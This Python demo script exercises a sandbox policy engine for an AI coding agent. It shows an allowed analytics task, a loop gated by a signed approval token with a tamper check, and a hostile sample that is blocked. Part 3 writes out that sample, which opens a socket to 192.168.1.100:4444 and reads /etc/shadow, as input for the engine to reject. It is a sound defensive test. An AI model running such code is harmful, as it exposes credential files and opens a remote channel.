"""
CLORA-SecBox 3-Part Live Demonstration.
SIH Problem Statement 26117 (MRPL)

Part 1: Low-Risk Analytics -> ALLOW -> Secure Execution -> Ed25519 Attestation
Part 2: Elevated Risk Task -> REQUIRE_APPROVAL -> Cryptographically Bound Token -> Verified Execution
Part 3: Prohibited Network/Subprocess -> PROHIBITED -> Zero Execution -> Audit Logged
"""

import os
import sys

# Ensure repository root is on sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

from backend.sandbox.coding_agent import CodingAgentLoop
from backend.sandbox.policy_engine import (
    DeterministicPolicyEngine,
    ExecutionRiskLevel,
    HITLTokenManager,
    SecurityPolicy,
)
from security.attestation import EvidenceVerifier

def run_secbox_demo():
    print("=" * 80)
    print("  CLORA-SecBox: 3-PART LIVE SECURITY & POLICY DEMONSTRATION")
    print("=" * 80)

    loop = CodingAgentLoop()
    engine = DeterministicPolicyEngine()
    hitl_mgr = HITLTokenManager()

    # -------------------------------------------------------------
    # PART 1: Low-Risk Industrial Analytics
    # -------------------------------------------------------------
    print("\n[PART 1: LOW-RISK ANALYTICS TASK]")
    task_1 = "Calculate average temperature delta and peak vibration RMS for Pump P-101"
    print(f"[*] Task Prompt: '{task_1}'")
    res1 = loop.run_coding_task(task_1, user_id="eng_01", user_role="Plant_Engineer")
    print(f"    -> Status: {res1.status}")
    print(f"    -> Risk Classification: {res1.risk_level}")
    print(f"    -> Runtime Tier: {res1.runtime_tier} (Mode: {res1.execution_mode})")
    print(f"    -> Code Executed: {res1.code_executed}")
    if res1.attestation_proof:
        proof = res1.attestation_proof
        print(f"    -> Ed25519 Proof ID: {proof.get('proof_id')}")
        print(f"    -> Signing Key ID: {proof.get('key_id')}")
        valid, msg, _ = EvidenceVerifier.verify_proof(proof)
        print(f"    -> Independent Offline Verification: {'VALID' if valid else 'INVALID'} ({msg})")

    # -------------------------------------------------------------
    # PART 2: Elevated Risk Task (Requires Cryptographic Sign-Off)
    # -------------------------------------------------------------
    print("\n[PART 2: ELEVATED RISK TASK - CRYPTOGRAPHIC HITL GATE]")
    elevated_code = (
        "# High-iteration computational convergence loop\n"
        "import math\n"
        "tolerance = 1e-6\n"
        "x = 1.0\n"
        "while abs(x**2 - 2.0) > tolerance:\n"
        "    x = 0.5 * (x + 2.0 / x)\n"
        "print(f'Converged square root of 2: {x}')\n"
    )
    print("[*] Inspecting complex script with 'while' loop...")
    eval_elevated = engine.evaluate(elevated_code, user_role="Plant_Engineer")
    print(f"    -> Risk Classification: {eval_elevated.risk_level.value}")
    print(f"    -> Allowed Without Approval: {eval_elevated.allowed}")
    print(f"    -> Requires Supervisor Approval: {eval_elevated.requires_approval}")
    print(f"    -> Flagged Reasons: {eval_elevated.reasons}")

    # Issue cryptographically bound token
    exec_id = "SECBOX-LIVE-ELEVATED-01"
    token_pkg = hitl_mgr.issue_approval_token(
        execution_id=exec_id,
        script_hash=eval_elevated.script_hash,
        input_hashes=eval_elevated.input_hashes,
        policy_id="STRICT_AIRGAP_V1",
        approver_id="operations_lead_sharma",
        validity_sec=300.0,
    )
    token = token_pkg["approval_token"]
    print(f"    -> Cryptographic Approval Token Issued: {token[:28]}...")
    print(f"    -> Bound Approver: {token_pkg['approver_id']}")
    print(f"    -> Token Expiry: {token_pkg['expires_at']}")

    # Validate token
    valid_token, val_msg = hitl_mgr.validate_approval_token(
        token=token,
        execution_id=exec_id,
        script_hash=eval_elevated.script_hash,
        input_hashes=eval_elevated.input_hashes,
        policy_id="STRICT_AIRGAP_V1",
        approver_id="operations_lead_sharma",
    )
    print(f"    -> Token Validation Result: {'APPROVED' if valid_token else 'REJECTED'} ({val_msg})")

    # Tamper test: Alter 1 character in script
    tampered_hash = "f" * 64
    tampered_valid, tampered_msg = hitl_mgr.validate_approval_token(
        token=token,
        execution_id=exec_id,
        script_hash=tampered_hash,  # Altered script hash!
        input_hashes=eval_elevated.input_hashes,
        policy_id="STRICT_AIRGAP_V1",
        approver_id="operations_lead_sharma",
    )
    print(f"    -> Adversarial 1-Byte Script Tamper Attempt: {'REJECTED (Correct)' if not tampered_valid else 'ACCEPTED (Vulnerability!)'} ({tampered_msg})")

    # -------------------------------------------------------------
    # PART 3: Prohibited Sockets & Subprocesses (Zero-Execution Boundary)
    # -------------------------------------------------------------
    print("\n[PART 3: PROHIBITED SENSITIVE CALLS - ZERO-EXECUTION BOUNDARY]")
    attack_script = (
        "import socket\n"
        "import subprocess\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.connect(('192.168.1.100', 4444))\n"
        "subprocess.run(['cat', '/etc/shadow'])\n"
    )
    print("[*] Evaluating hostile script attempting WAN socket connection & shell spawn...")
    eval_prohibited = engine.evaluate(attack_script, user_role="Plant_Engineer")
    print(f"    -> Risk Classification: {eval_prohibited.risk_level.value}")
    print(f"    -> Allowed: {eval_prohibited.allowed}")
    print(f"    -> Prohibited Violations Detected ({len(eval_prohibited.violations)}):")
    for v in eval_prohibited.violations:
        print(f"       * {v}")
    print("    -> Execution Status: HALTED PRIOR TO SANDBOX LAUNCH (Zero Bytes / Zero Processes Spawned)")
    print("\n" + "=" * 80)
    print("  ALL 3 PARTS COMPLETED - SECBOX POLICY & ATTESTATION VERIFIED")
    print("=" * 80)


if __name__ == "__main__":
    run_secbox_demo()
